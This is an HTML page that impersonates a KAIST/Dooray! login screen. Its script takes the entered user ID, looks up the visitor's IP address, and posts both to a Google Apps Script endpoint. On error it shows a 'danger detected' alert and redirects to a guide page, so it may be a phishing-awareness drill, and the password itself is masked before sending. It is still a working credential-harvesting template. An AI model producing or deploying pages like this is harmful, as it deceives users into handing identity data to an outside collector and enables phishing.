
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KAIST 로그인</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      width: 380px;
      background: #ffffff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .logo img {
      max-width: 180px;
      margin-bottom: 10px;
    }

    h2 {
      font-size: 22px;
      margin: 15px 0;
    }

    p {
      font-size: 14px;
      color: #666;
      margin: 5px 0 15px;
      line-height: 1.5;
    }

    .login-form {
      text-align: left;

    }

    .login-form label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      color: #333;
    }

    .login-form input {
      width: 100%;
      padding: 7px;
      margin-right: 20px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      
    }

    .options {

      display: block;
      justify-content: space-between;
      align-items: center;
      font-size: 14px;
      margin-bottom: 15px;
    }

    button {

      width: 100%;
      padding: 12px;
      background-color: #007bff;
      color: #ffffff;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #0056b3;
    }

    .links {
      margin-top: 15px;
    }

    .links a {
      display: block;
      font-size: 14px;
      color: #007bff;
      text-decoration: none;
      margin: 5px 0;
    }

    .links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  
 
  <div class="login-container">
    <div class="logo">
      <img src="https://dooray.com/static_images/logo_dooray.png" />
    </div>
    <h2>KAIST 로그인</h2>
    <p>Dooray! 서비스를 이용하기 위해 로그인합니다.</p>

    <form id="dataForm" class="login-form">
      <label for="aData">아이디</label>
      <input type="text" id="aData" placeholder="아이디" required>
      
      <label for="bData">비밀번호</label>
      <input type="password" id="bData" placeholder="비밀번호" required>
      
     
      <button type="submit">로그인</button>
    </form>
    <script>

      window.onload = function () {
       const urlParams = new URLSearchParams(window.location.search);
       const aDataValue = urlParams.get("aData"); // URL에서 aData의 값 읽기
          
       if (aDataValue) {
       document.getElementById("aData").value = aDataValue;
       }
      };
      
      document.getElementById('dataForm').addEventListener('submit', async function(e) {
       e.preventDefault();

       const aData = document.getElementById('aData').value;
       const bData = document.getElementById('bData').value;


       fetch('https://wtfismyip.com/json')
                 .then(response => response.json())
                 .then(data => {
                     const userIP = data.YourFuckingIPAddress;

                    // 서버로 데이터 전송
                     sendDataToServer(aData, "***", userIP);
                 })
                 .catch(error => console.error('IP fetch error:', error));
        });
    
      async function sendDataToServer(aData, bData, ip) {

        try {
          const response = await fetch('https://script.google.com/macros/s/AKfycbzu8SdA-VG7yDDrseQDe5DoHIy0rHsqhjY8VnTSv-uSxq6Z0LSLXpcAEdoHkiIZAKKt/exec', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ aData: aData, bData: bData, ipAddress: ip })
          })
          .then(response => {
            if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          return response.text(); // response.json() 대신 사용해보세요
          })
          .then(text => {
            if (text) {
              const data = JSON.parse(text);
              console.log(data);
            } else {
            console.log('Empty response');
            }
          })
          .catch(error => console.error('Error:', error));
        
        
          const result = await response.json();
          alert(result.result);
        }
        catch (error) {
         console.error('Error:', error);
         //alert('Error submitting data.');
         alert('위험탐지');
         window.location.href = "https://mailtest482.github.io/guide/";
        }
      }
    
    </script>
    
    <div class="links">
      <a href="#">비밀번호 찾기</a>
      <a href="#">계정 유형 선택하기</a>
    </div>
    <p>계정이 없으신가요?<br>조직 관리자에게 문의하여 계정 추가를 요청하세요.</p>


    
  </div>
   
</body>
</html>
